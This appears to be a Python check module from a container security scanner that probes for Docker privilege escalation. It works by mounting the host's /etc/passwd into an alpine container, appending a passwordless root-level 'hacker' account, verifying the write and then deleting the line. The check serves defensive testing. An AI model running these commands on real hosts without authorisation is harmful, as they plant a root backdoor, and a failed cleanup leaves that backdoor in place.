from docker import from_env
from docker.errors import DockerException

from integrityguard.domain.scan_result import ScanResult
from integrityguard.domain.severity import Severity
from integrityguard.interfaces.vulnerability_check import VulnerabilityCheck


class ElevatePrivilegeCheck(VulnerabilityCheck):
    """
    Simulates privilege escalation risk via container capabilities.
    """

    ID = "DX-004"
    NAME = "Elevate Privilege via Container"

    def __init__(self):
        pass

    def _get_safe_result(self, trace: list[str] = None) -> ScanResult:
        if trace is None:
            trace = ["Safe result generated."]
        else:
            trace.append("Safe result generated.")

        return ScanResult(
            check_id=self.ID,
            check_name=self.NAME,
            is_vulnerable=False,
            severity=Severity.LOW,
            description="Verifies if a container can elevate privileges via container capabilities.",
            evidence="Privilege escalation attempt failed or container runtime unreachable.",
            trace=trace,
        )

    def execute(self) -> ScanResult:
        trace = []

        try:
            trace.append("Connecting to Docker client...")
            client = from_env()

            write_cmd = "sh -c 'echo 'hacker::0:0:Hacker:/root:/bin/sh' >> /mnt/passwd && cat /mnt/passwd | grep hacker'"
            trace.append("Attempting to run alpine container with mounted volume...")
            trace.append(
                f"Command: docker run --rm -v /etc/passwd:/mnt/passwd:rw alpine {write_cmd}"
            )

            response = client.containers.run(
                image="alpine",
                command=write_cmd,
                remove=True,
                volumes={"/etc/passwd": {"bind": "/mnt/passwd", "mode": "rw"}},
            )
            trace.append("Container execution completed.")
            response_str = response.decode('utf-8').strip()

            if "hacker::0:0:Hacker:/root:/bin/sh" not in response_str:
                trace.append("Privilege escalation attempt failed or blocked.")
                return self._get_safe_result(trace)

            trace.append("Privilege escalation attempt succeeded.")

            trace.append("Reverting changes to /etc/passwd...")
            cleanup_cmd = "sed '\\#hacker::0:0:Hacker:/root:/bin/sh#d' /mnt/passwd > /tmp/passwd && cat /tmp/passwd > /mnt/passwd"
            trace.append(
                f"Command: docker run --rm -v /etc/passwd:/mnt/passwd:rw alpine sh -c '{cleanup_cmd}'"
            )

            client.containers.run(
                image="alpine",
                command=f"sh -c \"{cleanup_cmd}\"",
                remove=True,
                volumes={"/etc/passwd": {"bind": "/mnt/passwd", "mode": "rw"}},
            )
            trace.append("Cleanup completed.")

            return ScanResult(
                check_id=self.ID,
                check_name=self.NAME,
                is_vulnerable=True,
                severity=Severity.CRITICAL,
                description="Verifies if a container can modify /etc/passwd (Privilege Escalation).",
                evidence="Successfully wrote file to host /etc/passwd via container volume.",
                recommendation="Use <a href='https://docs.docker.com/engine/security/rootless/' target='_blank' rel='noopener noreferrer'>Rootless Docker</a> or ensure Docker socket is not exposed.",
                trace=trace,
            )

        except (DockerException, Exception) as e:
            trace.append(f"Exception occurred: {str(e)}")
            return ScanResult(
                self.ID, self.NAME, False, Severity.INFO, "Docker daemon unreachable", str(e), "Ensure Docker is running and accessible."
            )